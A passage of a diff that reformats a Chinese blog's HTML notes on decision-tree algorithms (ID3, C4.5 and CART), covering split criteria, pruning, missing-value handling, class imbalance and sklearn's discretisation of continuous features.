 <p>信息增益越大表示使用特征 A 来划分所获得的“纯度提升越大”。</p>
-<h3><span id="13-缺点没有剪枝-特征偏好-缺失值">1.3 缺点【没有剪枝、特征偏好、缺失值】</span></h3>
+<h3><span id="13缺点没有剪枝-特征偏好-缺失值">1.3
+缺点【没有剪枝、特征偏好、缺失值】</span></h3>
 <ul>
 <li>ID3 没有剪枝策略，容易过拟合；</li>
-<li>信息增益准则对可取值数目较多的特征有所偏好，类似“编号”的特征其信息增益接近于 1；</li>
+<li>信息增益准则对可取值数目较多的特征有所偏好，类似“编号”的特征其信息增益接近于
+1；</li>
 <li>只能用于处理离散分布的特征；</li>
 <li>没有考虑缺失值。</li>
 </ul>
@@ -995,33 +1155,39 @@ $$</p>
     
     <div class="post-body" itemprop="articleBody">
           <h2><span id="一-c45">一、C4.5</span></h2>
-<p>C4.5 算法最大的特点是克服了 ID3 对特征数目的偏重这一缺点，引入信息增益率来作为分类标准。</p>
+<p>C4.5 算法最大的特点是克服了 ID3
+对特征数目的偏重这一缺点，引入信息增益率来作为分类标准。</p>
 <p>C4.5 相对于 ID3 的缺点对应有以下改进方式：</p>
 <ul>
 <li>引入<strong>悲观剪枝策略进行后剪枝</strong>；</li>
 <li>引入<strong>信息增益率</strong>作为划分标准；</li>
-<li><strong>将连续特征离散化</strong>，假设 n 个样本的连续特征 A 有 m 个取值，C4.5 将其排序并取相邻两样本值的平均数共 m-1 个划分点，分别计算以该划分点作为二元分类点时的信息增益，并选择信息增益最大的点作为该连续特征的二元离散分类点；</li>
+<li><strong>将连续特征离散化</strong>，假设 n 个样本的连续特征 A 有 m
+个取值，C4.5 将其排序并取相邻两样本值的平均数共 m-1
+个划分点，分别计算以该划分点作为二元分类点时的信息增益，并选择信息增益最大的点作为该连续特征的二元离散分类点；</li>
 <li>对于<strong>缺失值的处理</strong>可以分为两个子问题：</li>
 <li>问题一：在特征值缺失的情况下进行划分特征的选择？（即如何计算特征的信息增益率）
 <ul>
-<li>C4.5 的做法是：对于具有缺失值特征，用没有缺失的样本子集所占比重来折算；</li>
-</ul>
-</li>
+<li>C4.5
+的做法是：对于具有缺失值特征，用没有缺失的样本子集所占比重来折算；</li>
+</ul></li>
 <li>问题二：选定该划分特征，对于缺失该特征值的样本如何处理？（即到底把这个样本划分到哪个结点里）
 <ul>
-<li>C4.5 的做法是：将样本同时划分到所有子节点，不过要调整样本的权重值，其实也就是以不同概率划分到不同节点中。</li>
-</ul>
-</li>
+<li>C4.5
+的做法是：将样本同时划分到所有子节点，不过要调整样本的权重值，其实也就是以不同概率划分到不同节点中。</li>
+</ul></li>
 </ul>
 <h3><span id="12-划分标准">1.2 划分标准</span></h3>
 <p>利用信息增益率可以克服信息增益的缺点，其公式为:</p>
-<p>$$<br>
-\operatorname{Gain}<em>{\text {ratio }}(D, A) =\frac{\operatorname{Gain}(D, A)}{H</em>{A}(D)}     \<br>
-$$</p>
-<p>$$<br>
-H_{A}(D)=-\sum_{i=1}^{n}   \frac{\left|D_{i}\right|}{|D|} \log <em>{2} \frac{\left|D</em>{i}\right|}{|D|}<br>
-$$</p>
-<p>信息增益率对可取值较少的特征有所偏好（分母越小，整体越大），因此 C4.5 并不是直接用增益率最大的特征进行划分，而是使用一个<strong>启发式方法</strong>：先从候选划分特征中找到信息增益高于平均值的特征，再从中选择增益率最高的。</p>
+<p><span class="math display">\[
+\operatorname{Gain}_{\text {ratio }}(D, A) =\frac{\operatorname{Gain}(D,
+A)}{H_{A}(D)}     \\
+\]</span></p>
+<p><span class="math display">\[
+H_{A}(D)=-\sum_{i=1}^{n}   \frac{\left|D_{i}\right|}{|D|} \log _{2}
+\frac{\left|D_{i}\right|}{|D|}
+\]</span></p>
+<p>信息增益率对可取值较少的特征有所偏好（分母越小，整体越大），因此 C4.5
+并不是直接用增益率最大的特征进行划分，而是使用一个<strong>启发式方法</strong>：先从候选划分特征中找到信息增益高于平均值的特征，再从中选择增益率最高的。</p>
 <h3><span id="13-剪枝策略">1.3 剪枝策略</span></h3>
 <p>为什么要剪枝：<strong>过拟合的树在泛化能力的表现非常差。</strong></p>
 <p><strong>预剪枝和悲观剪枝</strong></p>
@@ -1033,17 +1199,22 @@ $$</p>
 <li>节点划分前准确率比划分后准确率高。</li>
 </ul>
 <p>预剪枝不仅可以降低过拟合的风险而且还可以减少训练时间，但另一方面它是基于“贪心”策略，会带来欠拟合风险。</p>
-<h4><span id="132-后剪枝悲观剪枝方法-httpgitlinuxnet2019-06-04-c45"><strong>1.3.2 后剪枝</strong>【悲观剪枝方法】  </span></h4>
+<h4><span id="132后剪枝悲观剪枝方法-httpgitlinuxnet2019-06-04-c45"><strong>1.3.2
+后剪枝</strong>【悲观剪枝方法】 http://gitlinux.net/2019-06-04-C45/</span></h4>
 <p>在已经生成的决策树上进行剪枝，从而得到简化版的剪枝决策树。</p>
-<p>C4.5 采用的<strong>悲观剪枝方法</strong>，用递归的方式从低往上针对每一个非叶子节点，评估用一个最佳叶子节点去代替这课子树是否有益。如果剪枝后与剪枝前相比其错误率是保持或者下降，则这棵子树就可以被替换掉。<strong>C4.5 通过训练数据集上的错误分类数量来估算未知样本上的错误率</strong>。</p>
+<p>C4.5
+采用的<strong>悲观剪枝方法</strong>，用递归的方式从低往上针对每一个非叶子节点，评估用一个最佳叶子节点去代替这课子树是否有益。如果剪枝后与剪枝前相比其错误率是保持或者下降，则这棵子树就可以被替换掉。<strong>C4.5
+通过训练数据集上的错误分类数量来估算未知样本上的错误率</strong>。</p>
 <p>后剪枝决策树的欠拟合风险很小，泛化性能往往优于预剪枝决策树。但同时其训练时间会大的多。</p>
 <h3><span id="14-缺点">1.4 缺点</span></h3>
 <ul>
 <li><strong>剪枝策略</strong>可以再优化；</li>
 <li>C4.5 用的是<strong>多叉树</strong>，用二叉树效率更高；</li>
 <li>C4.5 只能用于<strong>分类</strong>；</li>
-<li>C4.5 使用的熵模型拥有大量耗时的<strong>对数运算</strong>，连续值还有<strong>排序运算</strong>；</li>
-<li>C4.5 在构造树的过程中，<strong>对数值属性值需要按照其大小进行排序</strong>，从中选择一个分割点，所以只适合于能够驻留于内存的数据集，当训练集大得无法在内存容纳时，程序无法运行。</li>
+<li>C4.5
+使用的熵模型拥有大量耗时的<strong>对数运算</strong>，连续值还有<strong>排序运算</strong>；</li>
+<li>C4.5
+在构造树的过程中，<strong>对数值属性值需要按照其大小进行排序</strong>，从中选择一个分割点，所以只适合于能够驻留于内存的数据集，当训练集大得无法在内存容纳时，程序无法运行。</li>
 </ul>
 
       
@@ -1153,109 +1324,144 @@ $$</p>
     
     <div class="post-body" itemprop="articleBody">
           <h2><span id="一-cart">一、CART</span></h2>
-<p>ID3 和 C4.5 虽然在对训练样本集的学习中可以尽可能多地挖掘信息，但是其生成的决策树分支、规模都比较大，CART 算法的二分法可以简化决策树的规模，提高生成决策树的效率。</p>
+<p>ID3 和 C4.5
+虽然在对训练样本集的学习中可以尽可能多地挖掘信息，但是其生成的决策树分支、规模都比较大，CART
+算法的二分法可以简化决策树的规模，提高生成决策树的效率。</p>
 <h3><span id="11-思想">1.1 思想</span></h3>
 <p>CART 包含的基本过程有分裂，剪枝和树选择。</p>
 <ul>
-<li>**分裂：**分裂过程是一个二叉递归划分过程，其输入和预测特征既可以是连续型的也可以是离散型的，CART 没有停止准则，会一直生长下去；</li>
-<li><strong>剪枝：<strong>采用</strong>代价复杂度剪枝</strong>，从最大树开始，每次选择训练数据熵对整体性能贡献最小的那个分裂节点作为下一个剪枝对象，直到只剩下根节点。CART 会产生一系列嵌套的剪枝树，需要从中选出一颗最优的决策树；</li>
-<li>**树选择：**用单独的测试集评估每棵剪枝树的预测性能（也可以用交叉验证）。</li>
+<li><strong>分裂：</strong>分裂过程是一个二叉递归划分过程，其输入和预测特征既可以是连续型的也可以是离散型的，CART
+没有停止准则，会一直生长下去；</li>
+<li><strong>剪枝：</strong>采用<strong>代价复杂度剪枝</strong>，从最大树开始，每次选择训练数据熵对整体性能贡献最小的那个分裂节点作为下一个剪枝对象，直到只剩下根节点。CART
+会产生一系列嵌套的剪枝树，需要从中选出一颗最优的决策树；</li>
+<li><strong>树选择：</strong>用单独的测试集评估每棵剪枝树的预测性能（也可以用交叉验证）。</li>
 </ul>
 <p>CART 在 C4.5 的基础上进行了很多提升。</p>
 <ul>
-<li>C4.5 为多叉树，运算速度慢，CART 为<strong>二叉树</strong>，运算速度快；</li>
+<li>C4.5 为多叉树，运算速度慢，CART
+为<strong>二叉树</strong>，运算速度快；</li>
 <li>C4.5 只能分类，CART 既可以分类也可以<strong>回归</strong>；</li>
-<li>CART 使用 <strong>Gini 系数作为变量的不纯度量</strong>，减少了<strong>大量的对数运算</strong>；</li>
-<li>CART 采用<strong>代理测试来估计缺失值</strong>，而 C4.5 以不同概率划分到不同节点中；</li>
-<li>CART 采用**“基于代价复杂度剪枝”方法进行剪枝，而 C4.5 采用悲观剪枝方法**。</li>
+<li>CART 使用 <strong>Gini
+系数作为变量的不纯度量</strong>，减少了<strong>大量的对数运算</strong>；</li>
+<li>CART 采用<strong>代理测试来估计缺失值</strong>，而 C4.5
+以不同概率划分到不同节点中；</li>
+<li>CART 采用<strong>“基于代价复杂度剪枝”方法进行剪枝，而 C4.5
+采用悲观剪枝方法</strong>。</li>
 </ul>
 <h3><span id="12-划分标准">1.2 划分标准</span></h3>
-<p><strong>熵模型拥有大量耗时的对数运算</strong>，基尼指数在简化模型的同时还保留了熵模型的优点。基尼指数代表了模型的不纯度，基尼系数越小，不纯度越低，特征越好。这和信息增益（率）正好相反。<br>
-$$<br>
-\begin{aligned} \operatorname{Gini}(D) &amp;=\sum_{k=1}^{K} \frac{\left|C_{k}\right|}{|D|}\left(1-\frac{\left|C_{k}\right|}{|D|}\right) =1- \sum_{k=1}<sup>{K}\left(\frac{\left|C_{k}\right|}{|D|}\right)</sup>{2}  &amp;\operatorname{Gini}(D \mid A) =\sum_{i=1}^{n} \frac{\left|D_{i}\right|}{|D|} \operatorname{Gini}\left(D_{i}\right) \end{aligned}<br>
-$$</p>
-<p><strong>基尼指数</strong>反映了从<strong>数据集中随机抽取两个样本，其类别标记不一致的概率</strong>。因此基尼指数越小，则数据集纯度越高。基尼指数偏向于特征值较多的特征，类似信息增益。基尼指数可以用来度量任何不均匀分布，是介于 0~1 之间的数，0 是完全相等，1 是完全不相等，<strong>基尼指数可以理解为熵模型的一阶泰勒展开。</strong></p>
+<p><strong>熵模型拥有大量耗时的对数运算</strong>，基尼指数在简化模型的同时还保留了熵模型的优点。基尼指数代表了模型的不纯度，基尼系数越小，不纯度越低，特征越好。这和信息增益（率）正好相反。
+<span class="math display">\[
+\begin{aligned} \operatorname{Gini}(D) &amp;=\sum_{k=1}^{K}
+\frac{\left|C_{k}\right|}{|D|}\left(1-\frac{\left|C_{k}\right|}{|D|}\right)
+=1-
+\sum_{k=1}^{K}\left(\frac{\left|C_{k}\right|}{|D|}\right)^{2}  &amp;\operatorname{Gini}(D
+\mid A) =\sum_{i=1}^{n} \frac{\left|D_{i}\right|}{|D|}
+\operatorname{Gini}\left(D_{i}\right) \end{aligned}
+\]</span></p>
+<p><strong>基尼指数</strong>反映了从<strong>数据集中随机抽取两个样本，其类别标记不一致的概率</strong>。因此基尼指数越小，则数据集纯度越高。基尼指数偏向于特征值较多的特征，类似信息增益。基尼指数可以用来度量任何不均匀分布，是介于
+0~1 之间的数，0 是完全相等，1
+是完全不相等，<strong>基尼指数可以理解为熵模型的一阶泰勒展开。</strong></p>
 <blockquote>
-<p><em><strong>基尼指数是信息熵中﹣logP在P=1处一阶泰勒展开后的结果！所以两者都可以用来度量数据集的纯度</strong></em></p>
+<p><strong><em>基尼指数是信息熵中﹣logP在P=1处一阶泰勒展开后的结果！所以两者都可以用来度量数据集的纯度</em></strong></p>
 </blockquote>
 <h3><span id="13-缺失值处理">1.3 缺失值处理</span></h3>
 <p>上文说到，模型对于缺失值的处理会分为两个子问题：</p>
 <ul>
 <li><strong>如何在特征值缺失的情况下进行划分特征的选择？</strong></li>
 </ul>
-<p>对于问题 1，<strong>CART 一开始严格要求分裂特征评估时只能使用在该特征上没有缺失值的那部分数据，在后续版本中，CART 算法使用了一种惩罚机制来抑制提升值，从而反映出缺失值的影响</strong>（例如，如果一个特征在节点的 20% 的记录是缺失的，那么这个特征就会减少 20% 或者其他数值）。</p>
+<p>对于问题 1，<strong>CART
+一开始严格要求分裂特征评估时只能使用在该特征上没有缺失值的那部分数据，在后续版本中，CART
+算法使用了一种惩罚机制来抑制提升值，从而反映出缺失值的影响</strong>（例如，如果一个特征在节点的
+20% 的记录是缺失的，那么这个特征就会减少 20% 或者其他数值）。</p>
 <ul>
 <li><strong>选定该划分特征，模型对于缺失该特征值的样本该进行怎样处理？</strong></li>
 </ul>
-<p>对于问题 2，CART 算法的机制是为树的每个节点都找到<strong>代理分裂器</strong>，无论在训练数据上得到的树是否有缺失值都会这样做。在代理分裂器中，特征的分值必须超过默认规则的性能才有资格作为代理（即代理就是<strong>代替缺失值特征作为划分特征的特征</strong>），<strong>当 CART 树中遇到缺失值时，这个实例划分到左边还是右边是决定于其排名最高的代理，如果这个代理的值也缺失了，那么就使用排名第二的代理</strong>，以此类推，如果所有代理值都缺失，那么默认规则就是把样本划分到较大的那个子节点。代理分裂器可以确保无缺失训练数据上得到的树可以用来处理包含确实值的新数据。</p>
+<p>对于问题 2，CART
+算法的机制是为树的每个节点都找到<strong>代理分裂器</strong>，无论在训练数据上得到的树是否有缺失值都会这样做。在代理分裂器中，特征的分值必须超过默认规则的性能才有资格作为代理（即代理就是<strong>代替缺失值特征作为划分特征的特征</strong>），<strong>当
+CART
+树中遇到缺失值时，这个实例划分到左边还是右边是决定于其排名最高的代理，如果这个代理的值也缺失了，那么就使用排名第二的代理</strong>，以此类推，如果所有代理值都缺失，那么默认规则就是把样本划分到较大的那个子节点。代理分裂器可以确保无缺失训练数据上得到的树可以用来处理包含确实值的新数据。</p>
 <h3><span id="14-剪枝策略">1.4 剪枝策略</span></h3>
-<p><strong>基于代价复杂度的剪枝</strong>:<a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv11066239">https://www.bilibili.com/read/cv11066239</a></p>
-<p>采用一种**“基于代价复杂度的剪枝**”方法进行<strong>后剪枝</strong>，这种方法会生成一系列树，每<strong>个树都是通过将前面的树的某个或某些子树替换成一个叶节点而得到的，这一系列树中的最后一棵树仅含一个用来预测类别的叶节点</strong>。然后用一种成本复杂度的度量准则来判断哪棵子树应该被一个预测类别值的叶节点所代替。<strong>这种方法需要使用一个单独的测试数据集来评估所有的树，根据它们在测试数据集熵的分类性能选出最佳的树</strong>。</p>
+<p><strong>基于代价复杂度的剪枝</strong>:https://www.bilibili.com/read/cv11066239</p>
+<p>采用一种<strong>“基于代价复杂度的剪枝</strong>”方法进行<strong>后剪枝</strong>，这种方法会生成一系列树，每<strong>个树都是通过将前面的树的某个或某些子树替换成一个叶节点而得到的，这一系列树中的最后一棵树仅含一个用来预测类别的叶节点</strong>。然后用一种成本复杂度的度量准则来判断哪棵子树应该被一个预测类别值的叶节点所代替。<strong>这种方法需要使用一个单独的测试数据集来评估所有的树，根据它们在测试数据集熵的分类性能选出最佳的树</strong>。</p>
 <blockquote>
-<p>从完整子树 $T0$ 开始， 通过在 $Ti$ 子树序列中裁剪真实误差最小【考虑叶子节点的个数】的子树，得到 $Ti+1$。<br>
-$$<br>
-$\alpha=\frac{R(t)-R(T)}{N(T)-1}$<br>
-$$</p>
+<p>从完整子树 <span class="math inline">\(T0\)</span> 开始， 通过在
+<span class="math inline">\(Ti\)</span>
+子树序列中裁剪真实误差最小【考虑叶子节点的个数】的子树，得到 <span class="math inline">\(Ti+1\)</span>。 <span class="math display">\[
+  $\alpha=\frac{R(t)-R(T)}{N(T)-1}$
+  \]</span></p>
 <p>【剪枝之后的误差 - 剪枝前的误差 / 叶子节点数 - 1】</p>
 <p>每次误差增加率最小的节点，得到一系列的子树，从中选择效果最好的【独立剪枝数据集】和【K折交叉验证】</p>
 </blockquote>
-<img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304211501941.png" alt="image-20220320215056933" style="zoom: 33%;">
+<p><img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304211501941.png" alt="image-20220320215056933" style="zoom: 33%;"></p>
 <p>我们来看具体看一下代价复杂度剪枝算法：</p>
-<p>首先我们将最大树称为 $T_0$, 我们希望减少树的大小来防止过拟合, 但又担心去掉节点后预测误差会增大, 所以我 们定义了一个损失函数来达到这两个变量之间的平衡。损失函数定义如下：<br>
-$$<br>
-C_\alpha(T)=C(T)+\alpha|T|<br>
-$$<br>
-$T$ 为任意子树, $C(T)$ 为预测误差, $|T|$ 为子树 $T$ 的叶子节点个数, $\alpha$ 是参数, $C(T)$ 衡量训练数据的拟合 程度, $|T|$ 衡量树的复杂度, $\alpha$ <strong>权衡拟合程度与树的复杂度</strong>。</p>
+<p>首先我们将最大树称为 <span class="math inline">\(T_0\)</span>,
+我们希望减少树的大小来防止过拟合, 但又担心去掉节点后预测误差会增大,
+所以我
+们定义了一个损失函数来达到这两个变量之间的平衡。损失函数定义如下： <span class="math display">\[
+C_\alpha(T)=C(T)+\alpha|T|
+\]</span> <span class="math inline">\(T\)</span> 为任意子树, <span class="math inline">\(C(T)\)</span> 为预测误差, <span class="math inline">\(|T|\)</span> 为子树 <span class="math inline">\(T\)</span> 的叶子节点个数, <span class="math inline">\(\alpha\)</span> 是参数, <span class="math inline">\(C(T)\)</span> 衡量训练数据的拟合 程度, <span class="math inline">\(|T|\)</span> 衡量树的复杂度, <span class="math inline">\(\alpha\)</span>
+<strong>权衡拟合程度与树的复杂度</strong>。</p>
 <h3><span id="15-类别不平衡">1.5 类别不平衡</span></h3>
-<p><font color="red"> CART 的一大优势在于：无论训练数据集有多失衡，它都可以将其子冻消除不需要建模人员采取其他操作。</font></p>
-<p>CART 使用了一种先验机制，其作用相当于对类别进行加权。这种先验机制嵌入于 CART 算法判断分裂优劣的运算 里, 在 CART 默认的分类模式中, 总是要计算每个节点关于根节点的类别频率的比值, 这就相当于对数据自动重加 权, 对类别进行均衡。</p>
-<p>对于一个二分类问题，节点 node 被分成类别 1 当且仅当:<br>
-$$<br>
-\frac{N_1(\text { node })}{N_1(\text { root })}&gt;\frac{N_0(\text { node })}{N_0(\text { root })}<br>
-$$<br>
-比如二分类，根节点属于 1 类和 0 类的分别有 20 和 80 个。在子节点上有 30 个样本，其中属于 1 类和 0 类的分 别是 10 和 20 个。如果 10/20&gt;20/80，该节点就属于 1 类。</p>
-<p>通过这种计算方式就无需管理数据真实的类别分布。假设有 $\mathrm{K}$ 个目标类别，就可以确保根节点中每个类别的概率 都是 $1 / \mathrm{K}$ 。这种默认的模式被称为“先验相等”。</p>
-<p>先验设置和加权不同之处在于先验不影响每个节点中的各类别样本的数量或者份额。先验影响的是每个节点的类别 赋值和树生长过程中分裂的选择。</p>
+<p><font color="red"> CART
+的一大优势在于：无论训练数据集有多失衡，它都可以将其子冻消除不需要建模人员采取其他操作。</font></p>
+<p>CART
+使用了一种先验机制，其作用相当于对类别进行加权。这种先验机制嵌入于 CART
+算法判断分裂优劣的运算 里, 在 CART 默认的分类模式中,
+总是要计算每个节点关于根节点的类别频率的比值, 这就相当于对数据自动重加
+权, 对类别进行均衡。</p>
+<p>对于一个二分类问题，节点 node 被分成类别 1 当且仅当: <span class="math display">\[
+\frac{N_1(\text { node })}{N_1(\text { root })}&gt;\frac{N_0(\text {
+node })}{N_0(\text { root })}
+\]</span> 比如二分类，根节点属于 1 类和 0 类的分别有 20 和 80
+个。在子节点上有 30 个样本，其中属于 1 类和 0 类的分 别是 10 和 20
+个。如果 10/20&gt;20/80，该节点就属于 1 类。</p>
+<p>通过这种计算方式就无需管理数据真实的类别分布。假设有 <span class="math inline">\(\mathrm{K}\)</span>
+个目标类别，就可以确保根节点中每个类别的概率 都是 <span class="math inline">\(1 / \mathrm{K}\)</span>
+。这种默认的模式被称为“先验相等”。</p>
+<p>先验设置和加权不同之处在于先验不影响每个节点中的各类别样本的数量或者份额。先验影响的是每个节点的类别
+赋值和树生长过程中分裂的选择。</p>
 <h3><span id="16-连续值处理">1.6 连续值处理</span></h3>
 <h4><span id="161-分类树">1.6.1 分类树</span></h4>
 <ul>
-<li>
-<p><strong><font color="red">如果特征值是连续值：CART的处理思想与C4.5是相同的，即将连续特征值离散化。唯一不同的地方是度量的标准不一样，</font></strong> <strong>CART采用基尼指数，而C4.5采用信息增益比</strong>。</p>
-</li>
-<li>
-<p>如果当前节点为连续属性，<strong>CART树中该属性（剩余的属性值）后面还可以参与子节点的产生选择过程</strong>。</p>
-</li>
+<li><p><strong><font color="red">如果特征值是连续值：CART的处理思想与C4.5是相同的，即将连续特征值离散化。唯一不同的地方是度量的标准不一样，</font></strong>
+<strong>CART采用基尼指数，而C4.5采用信息增益比</strong>。</p></li>
+<li><p>如果当前节点为连续属性，<strong>CART树中该属性（剩余的属性值）后面还可以参与子节点的产生选择过程</strong>。</p></li>
 </ul>
 <h3><span id="17-回归树">1.7 回归树</span></h3>
-<p><strong>CART（Classification and Regression Tree，分类回归树），从名字就可以看出其不仅可以用于分类，也可以应用于回归</strong>。其回归树的建立算法上与分类树部分相似，这里简单介绍下不同之处。</p>
+<p><strong>CART（Classification and Regression
+Tree，分类回归树），从名字就可以看出其不仅可以用于分类，也可以应用于回归</strong>。其回归树的建立算法上与分类树部分相似，这里简单介绍下不同之处。</p>
 <h5><span id="连续值处理rss残差平方和"><strong>连续值处理</strong>：RSS<strong>残差平方和</strong></span></h5>
-<p><strong>对于连续值的处理, CART 分类树采用基尼系数的大小来度量特征的各个划分点。在回归模型中, 我们使用常见的 和方差度量方式</strong>, 对于任意划分特征 $\mathrm{A}$, 对应的任意划分点 $\mathrm{s}$ 两边划分成的数据集 $D_1$ 和 $D_2$, 求出使 $D_1$ 和 $D_2$ 各自<strong>集合的均方差最小</strong>, 同时 $D_1$ 和 $D_2$ 的均方差之和最小所对应的特征和特征值划分点。表达式为:<br>
-$$<br>
-\min _{a, s}\left[\min <em>{c_1} \sum</em>{x_i \in D_1}\left(y_i-c_1\right)^2+\min <em>{c_2} \sum</em>{x_i \in D_2}\left(y_i-c_2\right)^2\right]<br>
-$$<br>
-其中, $c_1$ 为 $D_1$ 数据集的样本输出均值, $c_2$ 为 $D_2$ 数据集的样本输出均值。</p>
+<p><strong>对于连续值的处理, CART
+分类树采用基尼系数的大小来度量特征的各个划分点。在回归模型中,
+我们使用常见的 和方差度量方式</strong>, 对于任意划分特征 <span class="math inline">\(\mathrm{A}\)</span>, 对应的任意划分点 <span class="math inline">\(\mathrm{s}\)</span> 两边划分成的数据集 <span class="math inline">\(D_1\)</span> 和 <span class="math inline">\(D_2\)</span>, 求出使 <span class="math inline">\(D_1\)</span> 和 <span class="math inline">\(D_2\)</span>
+各自<strong>集合的均方差最小</strong>, 同时 <span class="math inline">\(D_1\)</span> 和 <span class="math inline">\(D_2\)</span>
+的均方差之和最小所对应的特征和特征值划分点。表达式为: <span class="math display">\[
+\min _{a, s}\left[\min _{c_1} \sum_{x_i \in
+D_1}\left(y_i-c_1\right)^2+\min _{c_2} \sum_{x_i \in
+D_2}\left(y_i-c_2\right)^2\right]
+\]</span> 其中, <span class="math inline">\(c_1\)</span> 为 <span class="math inline">\(D_1\)</span> 数据集的样本输出均值, <span class="math inline">\(c_2\)</span> 为 <span class="math inline">\(D_2\)</span> 数据集的样本输出均值。</p>
 <h5><span id="预测方式"><strong>预测方式</strong></span></h5>
-<p>对于决策树建立后做预测的方式，上面讲到了 CART 分类树采用叶子节点里概率最大的类别作为当前节点的预测类别。而回归树输出不是类别，它采用的是用最终叶子的均值或者中位数来预测输出结果。</p>
-<h4><span id="171-cart分类树建模时预测变量中存在连续和离散时会自动分别进行处理吗">1.7.1 CART分类树建模时，预测变量中存在连续和离散时，会自动分别进行处理吗？</span></h4>
+<p>对于决策树建立后做预测的方式，上面讲到了 CART
+分类树采用叶子节点里概率最大的类别作为当前节点的预测类别。而回归树输出不是类别，它采用的是用最终叶子的均值或者中位数来预测输出结果。</p>
+<h4><span id="171cart分类树建模时预测变量中存在连续和离散时会自动分别进行处理吗">1.7.1
+CART分类树建模时，预测变量中存在连续和离散时，会自动分别进行处理吗？</span></h4>
 <blockquote>
-<p>在使用sklearn的决策树CART建模时，预测变量中存在连续和离散时，会自动分别进行处理吗？ - 月来客栈的回答 - 知乎 <a target="_blank" rel="noopener" href="https://www.zhihu.com/question/472579561/answer/2002434993">https://www.zhihu.com/question/472579561/answer/2002434993</a></p>
+<p>在使用sklearn的决策树CART建模时，预测变量中存在连续和离散时，会自动分别进行处理吗？
+- 月来客栈的回答 - 知乎
+https://www.zhihu.com/question/472579561/answer/2002434993</p>
 </blockquote>
-<p><strong>对于这种连续型的特征变量，Sklearn中的具体做法（包括ID3、CART、随机森林等）是先对连续型特征变量进行排序处理</strong>，<strong><font color="red"> 然后取所有连续两个值的均值来离散化整个连续型特征变量。</font></strong></p>
-<p>假设现在某数据集其中一个特征维度为:<br>
-$$<br>
-[0.5,0.2,0.8,0.9,1.2,2.1,3.2,4.5]<br>
-$$<br>
-则首先需要对其进行排序处理, 排序后的结果为:<br>
-$$<br>
-[0.2,0.5,0.8,0.9,1.2,2.1,3.2,4.5]<br>
-$$<br>
-接着再计算所有连续两个值之间的平均值：<br>
-$$<br>
-[0.35,0.65,0.85,1.05,1.65,2.65,3.85]<br>
-$$<br>
+<p><strong>对于这种连续型的特征变量，Sklearn中的具体做法（包括ID3、CART、随机森林等）是先对连续型特征变量进行排序处理</strong>，<strong><font color="red">
+然后取所有连续两个值的均值来离散化整个连续型特征变量。</font></strong></p>
+<p>假设现在某数据集其中一个特征维度为: <span class="math display">\[
+[0.5,0.2,0.8,0.9,1.2,2.1,3.2,4.5]
+\]</span> 则首先需要对其进行排序处理, 排序后的结果为: <span class="math display">\[
+[0.2,0.5,0.8,0.9,1.2,2.1,3.2,4.5]
+\]</span> 接着再计算所有连续两个值之间的平均值： <span class="math display">\[
+[0.35,0.65,0.85,1.05,1.65,2.65,3.85]
+\]</span>
 这样，便得到了该特征离散化后的结果。最后在构造决策树时，只需要使用式最后离散化后的特征进行划分指标的计算即可。同时，值得一说的地方是<strong>目前Sklearn在实际处理时，会把所有的特征均看作连续型变量进行处理</strong>。</p>
 <p>下图所示为iris数据集根据sklearn中CART算法所建模的决策树的可视化结果：</p>
-<img src="https://picx.zhimg.com/v2-9081bc3cd5f2ec069212b79d5c5ff7d3_b.jpg" alt="img" style="zoom:50%;">
+<p><img src="https://picx.zhimg.com/v2-9081bc3cd5f2ec069212b79d5c5ff7d3_b.jpg" alt="img" style="zoom:50%;"></p>
 <p>从图中可以看到，<code>petal width</code>这个特征在前两次分类时的分割点分别为0.8和1.75。下面先来看看原始特征<code>petal width</code>的取值情况：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1.</span>  <span class="number">1.5</span> <span class="number">1.8</span> <span class="number">1.4</span> <span class="number">2.5</span> <span class="number">1.3</span> <span class="number">2.1</span> <span class="number">1.5</span> <span class="number">0.2</span> <span class="number">2.</span>  <span class="number">1.</span>  <span class="number">0.2</span> <span class="number">0.3</span> <span class="number">0.4</span> <span class="number">1.</span>  <span class="number">1.8</span> <span class="number">0.2</span> <span class="number">0.2</span> <span class="number">0.5</span> <span class="number">1.3</span> <span class="number">0.2</span> <span class="number">1.2</span> <span class="number">2.2</span> <span class="number">0.2</span> <span class="number">1.3</span> <span class="number">2.</span>  <span class="number">0.2</span> <span class="number">1.8</span> <span class="number">1.9</span> <span class="number">1.</span>  <span class="number">1.5</span> <span class="number">2.3</span> <span class="number">1.3</span> <span class="number">0.4</span> <span class="number">1.</span>  <span class="number">1.9</span> <span class="number">0.2</span> <span class="number">0.2</span> <span class="number">1.1</span> <span class="number">1.7</span> <span class="number">0.2</span> <span class="number">2.4</span> <span class="number">0.2</span> <span class="number">0.6</span> <span class="number">1.8</span> <span class="number">1.1</span> <span class="number">2.3</span> <span class="number">1.6</span> <span class="number">1.4</span> <span class="number">2.3</span> <span class="number">1.3</span> <span class="number">0.2</span> <span class="number">0.1</span> <span class="number">1.5</span> <span class="number">1.8</span> <span class="number">0.2</span> <span class="number">0.3</span> <span class="number">0.2</span> <span class="number">1.5</span> <span class="number">2.4</span> <span class="number">0.3</span> <span class="number">2.1</span> <span class="number">2.5</span> <span class="number">0.2</span> <span class="number">1.4</span> <span class="number">1.5</span> <span class="number">1.8</span> <span class="number">1.4</span> <span class="number">2.3</span> <span class="number">0.2</span> <span class="number">2.1</span> <span class="number">1.5</span> <span class="number">2.</span>  <span class="number">1.</span>  <span class="number">1.4</span> <span class="number">1.4</span> <span class="number">0.3</span> <span class="number">1.3</span> <span class="number">1.2</span> <span class="number">0.2</span> <span class="number">1.3</span> <span class="number">1.8</span> <span class="number">2.1</span> <span class="number">0.4</span> <span class="number">1.</span>  <span class="number">2.5</span> <span class="number">1.6</span> <span class="number">0.1</span> <span class="number">2.4</span> <span class="number">0.2</span> <span class="number">1.5</span> <span class="number">1.9</span> <span class="number">1.8</span> <span class="number">1.3</span> <span class="number">1.8</span> <span class="number">1.3</span> <span class="number">1.3</span> <span class="number">2.</span>  <span class="number">1.8</span> <span class="number">0.2</span> <span class="number">1.3</span> <span class="number">1.7</span> <span class="number">0.2</span> <span class="number">1.2</span> <span class="number">2.1</span>]</span><br></pre></td></tr></table></figure>
 <p>可以发现上面并没有0.8和1.75这两个取值。接着按上面的方法先排序，再取相邻两个值的平均作为离散化的特征，其结果为：</p>
